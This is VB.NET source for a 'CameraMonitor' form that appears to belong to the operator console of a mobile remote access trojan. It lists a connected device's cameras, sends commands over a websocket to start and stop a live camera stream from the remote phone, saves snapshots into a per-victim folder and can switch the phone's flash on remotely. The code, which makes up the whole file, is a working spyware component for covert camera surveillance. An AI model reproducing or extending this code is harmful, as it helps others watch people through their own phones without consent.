Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar
Imports System.Windows.Media.Media3D
Imports DrakeUI.Framework
Imports Newtonsoft.Json.Linq

Public Class CameraMonitor
    Public Btcli As BTClient
    Public FPS As Integer = 0
    Private websockclient As WebSocketClient = Nothing
    'comboTargts
    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                comboTargts.Text = "اختيار الكميرا"
                combosizes.Text = "جودة الصورة"
                Exit Select
            Case "CN" ' Chinese
                comboTargts.Text = "选择摄像头"
                combosizes.Text = "图像质量"
                Exit Select

            Case "RU" ' Russian
                comboTargts.Text = "Выбор камеры"
                combosizes.Text = "Качество изображения"
                Exit Select

            Case "TR" ' Turkish
                comboTargts.Text = "Kamera Seçimi"
                combosizes.Text = "Görüntü Kalitesi"
                Exit Select
            Case "SP" ' Spanish
                comboTargts.Text = "Selección de Cámara"
                combosizes.Text = "Calidad de Imagen"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                comboTargts.Text = "Seleção da Câmera"
                combosizes.Text = "Qualidade de Imagem"
                Exit Select


            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub
    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub

    Private Sub CameraMonitor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        Me.mytitle.Text = Camerastr & " | " & Btcli.name & " | " & Btcli.country
        translateme()

        statetimer.Start()
    End Sub

    Delegate Sub addsizedele(objs As Object())
    Public Sub addsizes(objs As Object())
        If Me.InvokeRequired Then
            Dim logr As addsizedele = New addsizedele(AddressOf addsizes)
            Me.Invoke(logr, New Object() {objs})

            Exit Sub
        Else
            Dim sizes As String() = objs(0)
            If sizes IsNot Nothing Then
                If sizes.Length > 0 Then
                    If sizes.Length = 1 Then
                        mainstatelabel.Text = "Error load camera" & sizes(0).ToString
                    Else
                        For Each siz In sizes
                            combosizes.Items.Add(siz.Replace("[", "").Replace("]", ""))
                        Next
                        combosizes.Text = "320x240"
                        combosizes.MaxDropDownItems = sizes.Length
                    End If
                End If
            End If
            If combosizes.Text = "Resolution" Then
                combosizes.Items.Add("320x240")
                combosizes.Items.Add("640x480")
                combosizes.Text = "320x240"
            End If
        End If
    End Sub

    Private Async Sub startbtn_Click(sender As Object, e As EventArgs) Handles startbtn.Click
        If startbtn.Enabled Then
            startbtn.Enabled = False
            stopbtn.Enabled = True
            viewimage.Image = My.Resources.btloader
            Dim loadit As String = Nothing
            ' Front Camera
            'Back Camera
            Select Case comboTargts.Text
                Case "Front Camera"
                    loadit = "1"
                Case "Back Camera"
                    loadit = "0"

                Case Else
                    loadit = Nothing
                    Exit Sub
            End Select
            If loadit Is Nothing Then
                BTAlerter.infos("Select screen type.")
                Return
            End If

            mainstatelabel.Text = selectedtypstr + ": " + comboTargts.Text + Space(10) + Connectingstr



            ' Validate and set default for SelectedRes
            Dim scrres As String = combosizes.Text
            If Not scrres.Contains("x") Then
                BTAlerter.infos("Select screen Resolution.")
                Return
            End If

            Dim qulty As String = qualitydrop.Text


            Dim datajoin As String = Await Task.Run(Function()
                                                        Return JoinServer(New With {
                                                            .case = "join",
                                                            .ping = "0",
                                                            .ismain = "0",
                                                            .chk = BTEngine.MainForm.Mainnextkey
                                                         }, BTEngine.MainForm.MainhttpClient)
                                                    End Function)

            Dim socketidf As String = Btcli.SecoundIDF

            Dim result As JObject = JObject.Parse(datajoin)
            If result("Success") IsNot Nothing Then
                Dim datastr As String = result("Success").ToString.Trim("""")
                Log_d("Cli IDF websock", datastr)
                'Main_IDF = datastr

                websockclient = New WebSocketClient(livcamstr, Btcli.address)

                Dim connectionThread = New Thread(Sub() websockclient.Connect(datastr))
                connectionThread.IsBackground = True
                connectionThread.Start()

                Do
                    Thread.Sleep(1)
                Loop While Not websockclient.IsConnected

                Log_d("IDF Ready to use", datastr)
                socketidf = datastr
            End If


            Dim data As New With {
                        .subcommand = "ON",
                        .SelectedCam = loadit,
                        .SelectedRes = scrres,
                        .skidf = socketidf,
                        .SelectedQua = qulty
                    }

            Dim commandstr As String = FormatCommand("Cam", data)


            Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                    }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

        End If
    End Sub



    Private Sub stopbtn_Click(sender As Object, e As EventArgs) Handles stopbtn.Click
        If stopbtn.Enabled Then
            Dim data As New With {
                        .subcommand = "OFF"
                    }

            Dim commandstr As String = FormatCommand("Cam", data)


            Dim chatData As New Dictionary(Of String, Object) From {
                                                {"msg", wrk},
                                                {"cmnd", commandstr}
                    }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

            startbtn.Enabled = True
            stopbtn.Enabled = False
            mainstatelabel.Text = "..."
            viewimage.Image = Nothing
            If websockclient IsNot Nothing Then
                websockclient.Disconnect(livcamstr, Btcli.address)
                websockclient = Nothing
            End If

        End If
    End Sub
    Public KEYsx As String = "Right"
    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        If viewimage.Image IsNot Nothing Then

            If KEYsx = "Right" Then
                KEYsx = "Down"

            ElseIf KEYsx = "Down" Then
                KEYsx = "Left"

            ElseIf KEYsx = "Left" Then
                KEYsx = "Up"

            ElseIf KEYsx = "Up" Then
                KEYsx = "Right"

            Else
                KEYsx = "Right"

            End If
        End If
    End Sub

    Private RotateFlipMap As Dictionary(Of String, RotateFlipType) = New Dictionary(Of String, RotateFlipType) From {
          {"Right", RotateFlipType.Rotate90FlipNone},
          {"Left", RotateFlipType.Rotate270FlipNone},
         {"Up", RotateFlipType.Rotate180FlipX},
            {"Down", RotateFlipType.Rotate180FlipY}
    }
    Public Function RotateFlip(ByVal TempImage As Bitmap) As Bitmap
        Try
            If RotateFlipMap.ContainsKey(KEYsx) Then
                TempImage.RotateFlip(RotateFlipMap(KEYsx))
            End If
            Return TempImage
        Catch ex As Exception
            Return TempImage
        End Try
    End Function

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles Button3.Click
        If viewimage.Image IsNot Nothing Then
            If Button3.Tag = "off" Then

                Button3.Tag = "on"
                savetimer.Start()

                Button3.ForeColor = Color.DeepSkyBlue
                boSave = True

            ElseIf Button3.Tag = "on" Then

                Button3.Tag = "off"
                Button3.ForeColor = Color.White
                savetimer.Stop()

                Dim cam As String = Btcli.userfolder & "\CameraSnaps"
                If Not Directory.Exists(cam) Then
                    Directory.CreateDirectory(cam)
                End If
                Process.Start(cam)
                Button3.ForeColor = Color.White
                Button3.BackColor = Color.Transparent
                boSave = False

            End If
        End If
    End Sub
    Public boSave As Boolean = False
    Public newphoto As Boolean = False
    Private Sub savetimer_Tick(sender As Object, e As EventArgs) Handles savetimer.Tick
        Try
            Dim cam As String = Btcli.userfolder & "\CameraSnaps"

            If boSave Then

                If newphoto Then
                    newphoto = False
                    If Not IO.Directory.Exists(cam) Then
                        IO.Directory.CreateDirectory(cam)
                    End If

                    If IO.Directory.Exists(cam) Then
                        viewimage.Image.Save(cam & "\p_" & DateAndTime.Now.ToString("yyMMddhhmmssfff") & ".jpg", Imaging.ImageFormat.Jpeg)
                    End If
                End If


            Else

                savetimer.Stop()
                savetimer.Dispose()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            Dim fpstext As String = ""
            If Me.FPS > 0 AndAlso stopbtn.Enabled Then
                fpstext = "FPS: " + FPS.ToString
                FPS = 0
            Else
                fpstext = "FPS: 0"
            End If
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Camerastr & " | " & Btcli.name & " | " & Btcli.country & " | " & fpstext

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Camerastr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub CameraMonitor_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        statetimer.Stop()
        If websockclient IsNot Nothing Then
            websockclient.Disconnect(livcamstr, Btcli.address)
            websockclient = Nothing
        End If
    End Sub

    Private Sub DrakeUIButtonIcon2_Click_1(sender As Object, e As EventArgs) Handles flashbtn.Click
        Dim stateflash As String = "0"
        If flashbtn.Tag = "off" Then

            If MyMsg.Show("Flash", "Turn the flash on ?", msgtype.Confirm, True) <> DialogResult.OK Then
                Return
            End If
            stateflash = "1"

            flashbtn.Tag = "on"
            flashbtn.ForeColor = Color.DeepSkyBlue

        ElseIf flashbtn.Tag = "on" Then

            stateflash = "0"

            flashbtn.Tag = "off"
            flashbtn.ForeColor = Color.White
            flashbtn.BackColor = Color.Transparent

        End If
        Dim chatData As New Dictionary(Of String, Object) From {
                                {"msg", "tols"},
                                {"cas", "f"},
                                {"extrs", stateflash}
         }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub
End Class